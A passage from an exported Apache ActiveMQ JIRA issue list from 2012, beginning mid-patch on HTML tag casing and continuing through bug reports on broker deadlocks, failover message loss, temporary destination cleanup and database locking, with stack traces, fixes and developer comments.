@@ -67,7 +66,7 @@
                     <div class=""top_red_bar""> 
                         <div id=""site-breadcrumbs""> 
                         </div> 
-                        <div id=""site-quicklinks""><P> 
+                        <div id=""site-quicklinks""><p> 
                             <a href=""http://activemq.apache.org/support.html""
                                title=""Get help and support using Apache ActiveMQ"">Support</a></p> 
                         </div> 
@@ -93,7 +92,7 @@
                                     <div class=""navigation""> 
                                         <div class=""navigation_top""> 
                                             <div class=""navigation_bottom""> 
-                                                <H3>Useful Links</H3> 
+                                                <h3>Useful Links</h3> 
  
                                                 <ul class=""alternate"" type=""square""> 
                                                     <li><a href=""http://activemq.apache.org/""
Index: activemq-web-console/src/main/webapp/404.html
===================================================================
--- activemq-web-console/src/main/webapp/404.html	(revision 1242141)
+++ activemq-web-console/src/main/webapp/404.html	(working copy)
@@ -22,8 +22,7 @@
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""> 
  
-<!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd""> 
-<html> 
+<html xmlns='http://www.w3.org/1999/xhtml'> 
 <head> 
     <meta http-equiv=""Content-Type"" content=""text/html; charset=iso-8859-1"" /> 
     <title>Apache ActiveMQ</title> 
@@ -67,7 +66,7 @@
                     <div class=""top_red_bar""> 
                         <div id=""site-breadcrumbs""> 
                         </div> 
-                        <div id=""site-quicklinks""><P> 
+                        <div id=""site-quicklinks""><p> 
                             <a href=""http://activemq.apache.org/support.html""
                                title=""Get help and support using Apache ActiveMQ"">Support</a></p> 
                         </div> 
@@ -92,7 +91,7 @@
                                     <div class=""navigation""> 
                                         <div class=""navigation_top""> 
                                             <div class=""navigation_bottom""> 
-                                                <H3>Useful Links</H3> 
+                                                <h3>Useful Links</h3> 
  
                                                 <ul class=""alternate"" type=""square""> 
                                                     <li><a href=""http://activemq.apache.org/""


","This is really N/A for this issue, but we are on Linux (RHEL6) VMs.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,86400,86400,,0%,86400,86400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Feb/12 22:44;labthug;activemq.patch;https://issues.apache.org/jira/secure/attachment/12513880/activemq.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,227178,,,Wed Feb 08 23:11:30 UTC 2012,,,,,,,Patch Available,,,,"0|i0ai7z:",59225,,,,,,,,,,,,,,,,,,,,,"08/Feb/12 22:44;labthug;The patch that was listed in the original submission;;;","08/Feb/12 23:11;tabish;patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
java.util.ConcurrentModificationException in org.apache.activemq.broker.region.Queue.iterate(),AMQ-3700,12541440,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,06/Feb/12 16:49,06/Feb/12 16:59,14/Jul/23 05:43,06/Feb/12 16:59,5.5.1,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"The following stack was reproduced in AMQ 5.5.1 but not the Fuse Message Broker version.

{noformat}

Exception in thread ""BrokerService[3561F026-E8F62746-2A202922-F17EADF0-7BCA8E67] Task-5053"" java.util.ConcurrentModificationException
jvm 1    | 	at java.util.LinkedHashMap$LinkedHashIterator.nextEntry(LinkedHashMap.java:373)
jvm 1    | 	at java.util.LinkedHashMap$ValueIterator.next(LinkedHashMap.java:388)
jvm 1    | 	at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1376)
jvm 1    | 	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:127)
jvm 1    | 	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)
jvm 1    | 	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
jvm 1    | 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
jvm 1    | 	at java.lang.Thread.run(Thread.java:662)

{noformat}

This can happened only in the case where the optimizedDispatch mode is enabled and multiple producers are waiting for space.  When the memory usage decreases and the notifications are run from the iterate() method the method can be called recursively leading to the error as items are removed from the messagesWaitingForSpace map.  

",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,226727,,,Mon Feb 06 16:59:32 UTC 2012,,,,,,,,,,,"0|i0ai93:",59230,,,,,,,,,,,,,,,,,,,,,"06/Feb/12 16:59;tabish;Fix applied in trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover using a JDBC Message Store and Virtual Topic can result in a lost message if queue is empty,AMQ-3695,12541072,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,03/Feb/12 13:39,02/May/13 02:29,14/Jul/23 05:43,03/Feb/12 13:47,5.5.1,,,,,5.6.0,,,Message Store,,,,0,failover,jdbc,masterslave,virtualtopic,,,,,"*Description:*
A consumer connects to the broker and expresses interest in the virtual topic and the queue is created and empty
The consumer then disconnects
The broker is killed and the producer fails over to the next broker
The producer sends the message to the topic
The consumer reconnects to the broker, however it has no message waiting the virtual topic's queue

*Symptom*
The queue for the virtual topic is not automatically created during the failover.

*Work around*
A work around for this issue is to use startup destinations on the slave brokers if the destination is known.","jdbc store, virtual topics, failover, master/slave shared store",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3445,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,226424,,,Fri Feb 03 13:47:11 UTC 2012,,,,,,,,,,,"0|i0ai9j:",59232,,,,,,,,,,,,,,,,,,,,,"03/Feb/12 13:47;gtully;fix in: http://svn.apache.org/viewvc?rev=1240162&view=rev

For new queues that match the virtual interceptor prefixes configured, an entry is added to the ack table and the get destinations query unions distinct on ack and messages table. This allows them to be found and loaded on start.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Blocked/Slow advisory consumers in duplex network connector, eventually breaks request/reply with temps",AMQ-3694,12540729,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,01/Feb/12 15:18,20/Jun/13 13:37,14/Jul/23 05:43,01/Feb/12 16:18,5.5.0,,,,,5.6.0,,,Broker,Connector,,,0,activemq,blocking,networkconnector,requestreply,temp,,,,"In duplex network connectors, the destinations and temp advisories are not acked. This leads to a buildup of advisory messages on the bridging broker and missing advisories on the target.
In the main, when the numbers of destinations is static and there are no temp queues per roundtrip this goes unnoticed.
If request/reply is used over a network with a temp queue per request (a bit of an anti pattern, they are typically per connection), the problem is quickly visible with the default prefetch. Very quickly advisories for temp queue creation and producer consumers get blocked and communication comes to a halt. 
The root cause is that advisories are not acked in the duplex case so we can only get 750 (.75*prefetch) of them before we block.

symptom{code}javax.jms.JMSException: The destination temp-queue://ID:xxx-xxx-0:7:17 does not exist.
{code} or replies do not get propagated back because the consumer advisory is blocked.",,ceposta,j@chicago,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,226124,,,Thu Jun 20 13:37:07 UTC 2013,,,,,,,,,,,"0|i0agq7:",58983,,,,,,,,,,,,,,,,,,,,,"01/Feb/12 16:18;gtully;fixed in http://svn.apache.org/viewvc?rev=1239188&view=rev

advisories are now acked in the duplex case, on a .75*prefetch basis like in the non duplex case.;;;","20/Jun/13 06:06;j@chicago;Does this problem affect 5.3.1 as well?  We are thinking about upgrading....
08:55:25,314 - [ActiveMQ Transport: tcp:///10.2.50.44:61616] [WARN] [TransportConnection.java:290] : Async error occurred: javax.jms.JMSException: The destination temp-queue://ID:xxxxx-37275-1371171214828-0:2171:1 does not exist.;;;","20/Jun/13 13:37;ceposta;Yes, the 5.3.1 is affected. In general, there has been a lot of hardening around network of brokers and temporary destinations since 5.3.1. Try out your use cases on the latest 5.8.0.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover cluster update broken when url contains server side options,AMQ-3685,12540135,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,27/Jan/12 15:06,11/Mar/19 12:51,14/Jul/23 05:43,27/Jan/12 15:09,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"When transport connector contains some server side config options like

{code}tcp://localhost:61617?transport.closeAsync=false{code}

failover transport can fail as it can try connecting to that url with all its server side options.",,ceposta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-7165,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,225550,,,Wed Feb 01 13:14:34 UTC 2012,,,,,,,,,,,"0|i0ai9z:",59234,,,,,,,,,,,,,,,,,,,,,"27/Jan/12 15:09;dejanb;Fixed with svn revision 1236707;;;","01/Feb/12 13:14;dejanb;Another commit (svn revison 1239118) goes further and improves the behavior of this feature in situations like:

- using backup transports
- using multiple transport connectors per broker;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Potential deadlock in vm transport setListener when sender is blocked pending space,AMQ-3684,12540024,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,27/Jan/12 11:31,10/Apr/12 09:43,14/Jul/23 05:43,10/Apr/12 09:43,5.5.1,,,,,5.6.0,,,Transport,,,,0,vmtransport,,,,,,,,"Noticed an intermittent dead lock in test:
{code}
""ActiveMQ Task-1"" daemon prio=5 tid=101953000 nid=0x10abf3000 in Object.wait() [10abf2000]
   java.lang.Thread.State: WAITING (on object monitor)
	at java.lang.Object.wait(Native Method)
	- waiting on <7ddcdb9a0> (a java.lang.Object)
	at java.lang.Object.wait(Object.java:485)
	at org.apache.activemq.thread.Valve.turnOff(Valve.java:71)
	- locked <7ddcdb9a0> (a java.lang.Object)
	at org.apache.activemq.transport.vm.VMTransport.setTransportListener(VMTransport.java:230)
	at org.apache.activemq.transport.TransportFilter.setTransportListener(TransportFilter.java:42)
	at org.apache.activemq.transport.TransportFilter.setTransportListener(TransportFilter.java:42)
	at org.apache.activemq.broker.TransportConnection.<init>(TransportConnection.java:140)
	at org.apache.activemq.broker.TransportConnector.createConnection(TransportConnector.java:302)
	at org.apache.activemq.broker.TransportConnector$1$1.run(TransportConnector.java:218)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
""RMI RenewClean-[192.168.1.9:57412]"" daemon prio=5 tid=10193d800 nid=0x10a7e7000 in Object.wait() [10a7e6000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
	at java.lang.Object.wait(Native Method)
	- waiting on <7dd894fe0> (a java.lang.ref.ReferenceQueue$Lock)
	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:118)
	- locked <7dd894fe0> (a java.lang.ref.ReferenceQueue$Lock)
	at sun.rmi.transport.DGCClient$EndpointEntry$RenewCleanThread.run(DGCClient.java:516)
	at java.lang.Thread.run(Thread.java:680)
""main"" prio=5 tid=101807000 nid=0x100501000 waiting on condition [1004fe000]
   java.lang.Thread.State: WAITING (parking)
	at sun.misc.Unsafe.park(Native Method)
	- parking to wait for  <7ddcdbc98> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:1987)
	at java.util.concurrent.LinkedBlockingQueue.put(LinkedBlockingQueue.java:306)
	at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:100)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
	at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
	at org.apache.activemq.broker.StubConnection.send(StubConnection.java:107)
	at org.apache.activemq.store.kahadb.KahaDBStoreRecoveryBrokerTest.testLargeQueuePersistentMessagesNotLostOnRestart(KahaDBStoreRecoveryBrokerTest.java:118)
...{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Feb/12 21:37;tabish;VMTransport.java;https://issues.apache.org/jira/secure/attachment/12513181/VMTransport.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,225527,,,Tue Apr 10 09:43:12 UTC 2012,,,,,,,,,,,"0|i0agqf:",58984,,,,,,,,,,,,,,,,,,,,,"27/Jan/12 13:39;gtully;we now deal separately with the case of a put blocked on capacity limit. http://svn.apache.org/viewvc?view=rev&rev=1236664;;;","02/Feb/12 11:19;gtully;hmm, another variant of this, seems like enqueueValve needs to allow release when enqueue is blocked, but that requires knowledge of the blocking queue. Another case of blocked threads due to a blocked put.
{code}""ActiveMQ Task-3"" daemon prio=5 tid=101a43800 nid=0x10c1c7000 in Object.wait() [10c1c6000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.Valve.turnOff(Valve.java:71)
        - locked <7dbf3c140> (a java.lang.Object)
        at org.apache.activemq.transport.vm.VMTransport.start(VMTransport.java:131)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
        at org.apache.activemq.broker.TransportConnection.start(TransportConnection.java:895)
        - locked <7dbea0258> (a org.apache.activemq.broker.TransportConnection)
        at org.apache.activemq.broker.TransportConnector$1$1.run(TransportConnector.java:217)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)        at java.lang.Thread.run(Thread.java:680)


""ActiveMQ Task-4"" daemon prio=5 tid=101a19800 nid=0x10c4d0000 in Object.wait() [10c4cf000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <7dbf3c140> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.Valve.increment(Valve.java:97)
        - locked <7dbf3c140> (a java.lang.Object)
        at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:196)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:680)

{code};;;","03/Feb/12 21:37;tabish;Here's a modded VMTransport.java that removes the use of the Valve class which has some contention issues, and replaces it with a ReentrantReadWriteLock.  Also improves on the lazy init code by taking advantage of changes made since Java 1.5.;;;","09/Apr/12 15:50;johno;Are we ok to close this ticket? I see there has been a lot of work done to VMTransport related to sync.;;;","10/Apr/12 09:43;gtully;this is sorted by tim's changes. thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DatabaseLocker should first cancel locking SQL statement before closing the SQL connection,AMQ-3681,12539772,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,metatech,metatech,25/Jan/12 14:41,16/Apr/12 13:29,14/Jul/23 05:43,16/Apr/12 13:29,5.4.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"ActiveMQ is configured in a Master/Slave configuration with an Oracle database :
http://activemq.apache.org/jdbc-master-slave.html
http://servicemix.apache.org/clustering.html
When the slave node is stopping, ""activemq-broker"" stays forever in the ""Stopping"" state.
This is because the locking SQL statement cannot be interrupted by just closing the JDBC connection.  It is also needed to ""cancel"" the SQL statement.
Here is a patch to DefaultDatabaseLocker which makes it compatible with Oracle.
Thanks.

{code}

""Thread-92"" prio=10 tid=0x08c4d800 nid=0x1036 waiting for monitor entry [0x8ab3a000]
   java.lang.Thread.State: BLOCKED (on object monitor)
	at oracle.jdbc.driver.PhysicalConnection.isClosed(PhysicalConnection.java:1223)
	- waiting to lock <0xad4367e0> (a oracle.jdbc.driver.T4CConnection)
	at org.apache.commons.dbcp.DelegatingConnection.isClosed(DelegatingConnection.java:386)
	at org.apache.commons.dbcp.DelegatingConnection.isClosed(DelegatingConnection.java:386)
	at org.apache.commons.dbcp.PoolingDataSource$PoolGuardConnectionWrapper.isClosed(PoolingDataSource.java:201)
	at org.apache.activemq.store.jdbc.DefaultDatabaseLocker.stop(DefaultDatabaseLocker.java:137)
	at com.mycompany.PoolCloser.close(PoolCloser.java:77)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.aries.blueprint.utils.ReflectionUtils.invoke(ReflectionUtils.java:221)
	at org.apache.aries.blueprint.container.ServiceListener.invokeMethod(ServiceListener.java:98)
	at org.apache.aries.blueprint.container.ServiceListener.unregister(ServiceListener.java:65)
{code}",ServiceMix 4.3,metatech,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,,,,,,,,,,,,,,,,,,,,AMQ-3654,,,,,AMQ-3696,,,,,,,,"25/Jan/12 14:43;metatech;amq_stopping_slave.patch;https://issues.apache.org/jira/secure/attachment/12511840/amq_stopping_slave.patch","26/Jan/12 14:50;metatech;amq_stopping_slave_2.patch;https://issues.apache.org/jira/secure/attachment/12511985/amq_stopping_slave_2.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,225275,,,Mon Apr 16 13:29:57 UTC 2012,,,,,,,Patch Available,,,,"0|i0agqn:",58985,,,,,,,,,,,,,,,,,,,,,"26/Jan/12 14:49;metatech;Another problem that can occur : 
when the network cable is unplugged, the ActiveMQ shutdown hook freezes because it cannot close the connection, which is locked by the ""DefaultDatabaseLocker.keepAlive"" method.  The ""kill"" command does not work, ""kill -9"" is needed.
Here is a second patch that also fixes this problem.
{code}
""ActiveMQ ShutdownHook"" daemon prio=5 Thread id=73 BLOCKED
	oracle.jdbc.driver.PhysicalConnection.isClosed(PhysicalConnection.java:1223)
	org.apache.commons.dbcp.DelegatingConnection.isClosed(DelegatingConnection.java:386)
	org.apache.commons.dbcp.DelegatingConnection.isClosed(DelegatingConnection.java:386)
	org.apache.commons.dbcp.PoolingDataSource$PoolGuardConnectionWrapper.isClosed(PoolingDataSource.java:201)
	org.apache.activemq.store.jdbc.DefaultDatabaseLocker.stop(DefaultDatabaseLocker.java:137)
	org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.stop(JDBCPersistenceAdapter.java:328)
	org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
	org.apache.activemq.broker.BrokerService.stop(BrokerService.java:583)
	org.apache.activemq.broker.BrokerService.containerShutdown(BrokerService.java:1971)
	org.apache.activemq.broker.BrokerService$4.run(BrokerService.java:1938)
{code};;;","13/Apr/12 05:58;rajdavies;patch applied in SVN revision 1325621;;;","16/Apr/12 12:43;gtully;Unfortunately the embedded derby jdbc store used in the unit tests does not support java.sql.Statement#setQueryTimeout

We need to use it in an oracle specific lock implementation of make its use configurable

org.apache.activemq.usecases.JdbcDurableSubDupTest demonstrates;;;","16/Apr/12 12:54;gtully;hmm. well derby should have it once we upgrade[1], can any one easily validate mysql or mssqlserver?

[1] https://issues.apache.org/jira/browse/DERBY-31;;;","16/Apr/12 13:29;gtully;junit tests are ok with the latest derby and looks like current versions of mysql and mssqlserver have support but not postgresql.
Making this conditional on queryTimeout attribute > 0 to that it can be disabled via configuration on the default database locker. Default value 10seconds.

http://svn.apache.org/viewvc?rev=1326610&view=rev
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cleanup of temporary destinations by PooledConnection and ConnectionPool either leaks temp dests or deletes too many,AMQ-3680,12539703,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,artnaseef,artnaseef,25/Jan/12 00:39,13/Apr/12 20:55,14/Jul/23 05:43,13/Apr/12 20:55,,,,,,5.6.0,,,JMS client,,,,0,,,,,,,,,"Creating this as follow-up on AMQ-3457.

AMQ-3457 removed cleanup on call to close() for PooledConnection objects, causing temporary destinations to remain in the broker until all uses of the actual underlying ActiveMQ connection are closed.  Since those other uses of the underlying connection can be held indefinitely, or - on a very active system - there might be almost no time when there are no users of a connection, those temporary destinations essentially create a leak.

The most correct operation would remove the temporary destination for each PooledConnection when it's close() method is called.

Prior to AMQ-3457, updates for AMQ-2349 attempted to resolve this problem, but ended up being overly-aggressive, removing all of the temporary destinations from the underlying connection.  So, one PooledConnection's close() deleted temporary destinations for multiple PooledConnection objects which were still active.

Test case and patch will be provided.",,artnaseef,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,7200,7200,,0%,7200,7200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Jan/12 00:47;artnaseef;TestConnectionPoolTempCleanup.java;https://issues.apache.org/jira/secure/attachment/12511768/TestConnectionPoolTempCleanup.java","25/Jan/12 00:45;artnaseef;pooledConnCleanupOwnTemps.patch;https://issues.apache.org/jira/secure/attachment/12511767/pooledConnCleanupOwnTemps.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,225206,,,Fri Apr 13 20:55:11 UTC 2012,,,,,,,Patch Available,,,,"0|i0aian:",59237,,,,,,,,,,,,,,,,,,,,,"25/Jan/12 00:45;artnaseef;Patch which adds the correct cleanup on close() of PooledConnection.
;;;","25/Jan/12 00:47;artnaseef;JUnit that quickly demonstrates the issue.

Includes code to test that a connection's temporary destinations are removed as well as another test that one connection doesn't remove the temp destinations of another.;;;","13/Apr/12 20:55;tabish;Fix applied with a few mods and license header additions.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Bad osgi metadata for activeio-core introduced with fix for AMQ-3461,AMQ-3679,12539702,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,mckibben,mckibben,25/Jan/12 00:31,25/Jan/12 08:44,14/Jul/23 05:43,25/Jan/12 08:44,5.5.1,,,,,,,,,,,,0,,,,,,,,,"The pom.xml for the activeio component generates invalid OSGI metadata for the optional import of the org.objectweb.howl.log package. I believe this should be changed to:

<activeio.osgi.import.pkg>
         org.objectweb.howl.log*;resolution:=optional,
         *
</activeio.osgi.import.pkg>",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3461,,,,,,,,,,"25/Jan/12 00:38;mckibben;patch;https://issues.apache.org/jira/secure/attachment/12511761/patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,225205,,,Wed Jan 25 08:44:51 UTC 2012,,,,,,,Patch Available,,,,"0|i0s0e7:",161540,,,,,,,,,,,,,,,,,,,,,"25/Jan/12 00:38;mckibben;Patch for bnd OSGI metadata generation in pom.xml;;;","25/Jan/12 08:44;dejanb;Thanks for spotting this, it fixed now with svn revision 1235685

We'll need to make a new minor release for these changes to take effect.

BTW. You only need activeio bundle deployed if you're using old amq persistence store. If you're using kahadb it's not needed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Active Durable Topic Consumer is not re-assigned to Topic after it is deleted and recreated,AMQ-3678,12539600,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,dominict,dominict,24/Jan/12 12:09,16/Apr/12 05:48,14/Jul/23 05:43,16/Apr/12 05:48,5.5.1,,,,,5.6.0,,,Broker,,,,0,Topic,,,,,,,,"If I have a durable subscriber on a topic, which is *{{active}}*; and a message 
producer is sending to the topic. If the topic is deleted (whist the durable 
consumer is *{{active}}*), should the durable subscription be re-added to the 
topic (as a consumer) when it the TOPIC is subsequently recreated by the producer 
on the next message send? 

When replicating the above with a QUEUE that has an active consumer and producer.
If you delete the queue whilst the producer and consumer are active, the next message 
sent by the producer recreates the QUEUE, and the active consumer is then registered 
as a consumer on the queue.  However, this isn't the case for an active durable consumer 
(which isn't re-added as a consumer); when the TOPIC is subsequently recreated by the 
producer's next message to the topic.


It could be the case that you should not be able to delete the topic, via jmx, when
an active durable consumer is present?  If so, then should this logic also apply to the queue? (not able
to delete it via jmx when it has an active consumer).


To re-attach the active durable consumer to the newly created topic, in 
- http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/Topic.java

You could apply the attached patch to the *{{public void addSubscription(ConnectionContext context, final Subscription sub) throws Exception }}* method (line 112) to re-add the durable consumer. (junit included)


----

